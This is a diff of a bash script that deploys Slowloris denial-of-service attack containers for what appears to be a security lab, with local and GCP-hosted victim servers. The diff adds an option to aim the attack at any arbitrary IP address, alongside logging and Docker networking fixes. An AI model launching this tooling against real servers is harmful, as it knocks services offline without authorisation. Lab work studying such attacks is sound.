@@ -23,7 +23,7 @@ if [ -f "gcp.env" ]; then
     ZONE="$GCP_ZONE"
     PROJECT="$GCP_PROJECT_ID"
 else
-    echo -e "${YELLOW}[WARNING]${NC} gcp.env not found, using hardcoded defaults"
+    echo -e "${BLUE}[INFO]${NC} gcp.env not found, using hardcoded defaults"
     echo -e "${BLUE}[INFO]${NC} Run './setup-gcp-infrastructure.sh' to create proper configuration"
     TARGET_SERVER_IP=""
     VM_NAME="slowloris-victim"
@@ -34,8 +34,8 @@ fi
 # Function to display usage
 usage() {
     echo "Bonus Slowloris Lab - Attack Deployment"
-    echo ""  
-    echo "Usage: $0 [ATTACK_TYPE] [TARGET] [OPTIONS]"
+    echo ""
+    echo "Usage: $0 [ATTACK_TYPE] [TARGET | IP_ADDRESS] [OPTIONS]"
     echo ""
     echo "ATTACK_TYPE:"
     echo "  basic     - Basic slowloris attack (HTTP/1.1)"
@@ -45,6 +45,7 @@ usage() {
     echo "TARGET:"
     echo "  local     - Attack local containerized server"
     echo "  gcp       - Attack GCP-hosted server (uses gcp.env config)"
+    echo "  IP_ADDRESS - Attack a server at a specific IP address"
     echo ""
     echo "OPTIONS:"
     echo "  --connections NUM    Override default connection count"
@@ -64,29 +65,36 @@ usage() {
 
 # Function to log messages
 log() {
-    echo -e "${BLUE}[$(date +'%Y-%m-%d %H:%M:%S')] $1${NC}"
+    # Redirect echo to standard error (>&2)
+    echo -e "${BLUE}[$(date +'%Y-%m-%d %H:%M:%S')] $1${NC}" >&2
 }
 
 log_success() {
-    echo -e "${GREEN}[$(date +'%Y-%m-%d %H:%M:%S')] $1${NC}"
+    # Redirect echo to standard error (>&2)
+    echo -e "${GREEN}[$(date +'%Y-%m-%d %H:%M:%S')] $1${NC}" >&2
 }
 
 log_error() {
+    # This one should already be correct, but let's ensure it is
     echo -e "${RED}[$(date +'%Y-%m-%d %H:%M:%S')] ERROR: $1${NC}" >&2
 }
 
 log_warning() {
-    echo -e "${YELLOW}[$(date +'%Y-%m-%d %H:%M:%S')] WARNING: $1${NC}"
+    # Redirect echo to standard error (>&2)
+    echo -e "${YELLOW}[$(date +'%Y-%m-%d %H:%M:%S')] WARNING: $1${NC}" >&2
 }
 
 # Function to stop attack containers
 stop_attacks() {
     log "Stopping attack containers..."
     
-    containers=$(docker ps -q --filter "name=slowloris-*-attack" 2>/dev/null || true)
+    # We use a more robust regex filter (^ means start of string, $ means end of string)
+    containers=$(docker ps -q --filter "name=^slowloris-.*-attack$" 2>/dev/null || true)
+    
     if [ -n "$containers" ]; then
         docker stop $containers
-        log_success "Attack containers stopped and preserved for inspection"
+        # docker rm $containers # Also remove the container after stopping
+        log_success "Attack containers stopped"
     else
         log_warning "No running attack containers found"
     fi
@@ -150,24 +158,24 @@ get_gcp_target_ip() {
 # Function to get local target IP with improved detection
 get_local_target_ip() {
     local forced_server_type="$1"
-    
+
     # Get list of running server containers
     local old_running=$(docker ps -q --filter "name=^slowloris-old-server$" | wc -l)
     local latest_running=$(docker ps -q --filter "name=^slowloris-latest-server$" | wc -l)
-    
+
     local server_type=""
-    
+
     if [ -n "$forced_server_type" ]; then
         # User specified server type explicitly
         server_type="$forced_server_type"
         local container_name="slowloris-${server_type}-server"
-        
+
         if ! docker ps --format "{{.Names}}" | grep -q "^${container_name}$"; then
             log_error "Specified server type '$server_type' is not running"
             log "Run './deploy-server.sh $server_type local' to start the server first"
             exit 1
         fi
-        
+
         log "Using explicitly specified server type: $server_type"
     elif [ "$old_running" -eq 1 ] && [ "$latest_running" -eq 0 ]; then
         # Only old server running
@@ -177,29 +185,24 @@ get_local_target_ip() {
         # Only latest server running
         server_type="latest"
         log "Auto-detected server type: latest"
-    elif [ "$old_running" -eq 1 ] && [ "$latest_running" -eq 1 ]; then
+    elif [ "$old_running" -ge 1 ] && [ "$latest_running" -ge 1 ]; then
         # Both servers running - require user input
         log_error "Both 'old' and 'latest' servers are running. Please specify which one to target:"
         echo ""
         echo "  $0 $ATTACK_TYPE $TARGET --server-type old [other options]"
         echo "  $0 $ATTACK_TYPE $TARGET --server-type latest [other options]"
         echo ""
-        echo "Running servers:"
-        echo "  - slowloris-old-server"
-        echo "  - slowloris-latest-server"
         exit 1
     else
         # No servers running
         log_error "No local server containers found"
         echo ""
-        echo "Available server types:"
-        echo "  ./deploy-server.sh old local     # Apache 2.2.14 (vulnerable)"
-        echo "  ./deploy-server.sh latest local  # Modern Apache"
+        echo "Run './deploy-server.sh old local' or './deploy-server.sh latest local' first."
         exit 1
     fi
-    
-    # For bridge networking, use localhost with mapped port
-    echo "localhost"
+
+    # Return the exact container name to be used as a hostname on the docker network
+    echo "slowloris-${server_type}-server"
 }
 
 # Function to get target port based on deployment type
@@ -241,36 +244,49 @@ run_attack() {
     local target_ip="$2"
     local target_port="$3"
     local connections="$4"
-    
+
     local container_name="slowloris-${attack_type}-attack"
     local script_name=""
     local extra_args=""
-    
+    local network_name="slowloris-net"
+
     # Determine script and arguments based on attack type
     case "$attack_type" in
         basic)
             script_name="slowloris.py"
-            extra_args="--port $target_port"
+            extra_args="--port 80"
             ;;
         advanced)
             script_name="advanced_slowloris.py"
-            extra_args="--port $target_port --header-size 100 --sleep 15"
+            extra_args="--port 80 --header-size 100 --sleep 15"
             ;;
         cloud)
             script_name="cloud_advanced_slowloris.py"
-            extra_args="--port $target_port --header-size 150 --sleep 12 --adaptive --stealth"
+            extra_args="--port 80 --header-size 150 --sleep 12"
             ;;
     esac
-    
-    log "Launching $attack_type attack against $target_ip:$target_port with $connections connections..."
-    
-    # Run attack container in detached mode
+
+    # Ensure the shared network exists for local deployments
+    if [ "$TARGET" = "local" ] && ! docker network ls --format "{{.Name}}" | grep -q "^${network_name}$"; then
+        log "Creating docker network: $network_name"
+        docker network create "$network_name"
+    fi
+
+    log "Launching $attack_type attack against $target_ip with $connections connections..."
+
+    local network_config="--network $network_name"
+    if [[ "$TARGET" != "local" ]]; then
+        network_config="--network bridge"
+        extra_args=$(echo "$extra_args" | sed "s/--port 80/--port $target_port/")
+    fi
+
+    # Run attack container in detached mode with unbuffered Python output (-u)
     docker run -d \
         --name "$container_name" \
-        --network bridge \
+        $network_config \
         slowloris-attack \
-        python "$script_name" "$target_ip" "$connections" $extra_args
-    
+        python -u "$script_name" "$target_ip" "$connections" $extra_args
+
     log_success "Attack container '$container_name' started successfully"
     log "Monitor with: docker logs -f $container_name"
 }
@@ -380,30 +396,42 @@ if [ -z "$CONNECTIONS" ]; then
     esac
 fi
 
-# Validate Docker is available
-if ! command -v docker &> /dev/null; then
-    log_error "Docker is not installed or not in PATH"
-    exit 1
+# Get target IP and port, differentiating between health check and attack target for local runs
+HEALTH_CHECK_IP=""
+
+if [[ "$TARGET" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
+    log "Using provided IP address as target: $TARGET"
+    TARGET_IP="$TARGET"
+    HEALTH_CHECK_IP="$TARGET"
+else
+    case "$TARGET" in
+        local)
+            # Health check runs from the host machine and targets the published port (localhost)
+            HEALTH_CHECK_IP="localhost"
+            # The attack container will target the server container directly by its name on the docker network
+            TARGET_IP=$(get_local_target_ip "$SERVER_TYPE")
+            ;;
+        gcp)
+            if ! command -v gcloud &> /dev/null; then
+                log_error "gcloud CLI is not installed"
+                exit 1
+            fi
+            TARGET_IP=$(get_gcp_target_ip)
+            HEALTH_CHECK_IP="$TARGET_IP" # For GCP, health check and attack target are the same public IP
+            ;;
+        *)
+            log_error "Invalid target: $TARGET. Must be 'local', 'gcp', or an IP address."
+            usage
+            exit 1
+            ;;
+    esac
 fi
 
-# Get target IP and port
-case "$TARGET" in
-    local)
-        TARGET_IP=$(get_local_target_ip "$SERVER_TYPE")
-        ;;
-    gcp)
-        if ! command -v gcloud &> /dev/null; then
-            log_error "gcloud CLI is not installed"
-            exit 1
-        fi
-        TARGET_IP=$(get_gcp_target_ip)
-        ;;
-esac
 
 TARGET_PORT=$(get_target_port "$TARGET")
 
-# Perform health check
-if ! health_check "$TARGET_IP" "$TARGET_PORT"; then
+# Perform health check on the correct, reachable IP
+if ! health_check "$HEALTH_CHECK_IP" "$TARGET_PORT"; then
     exit 1
 fi
 
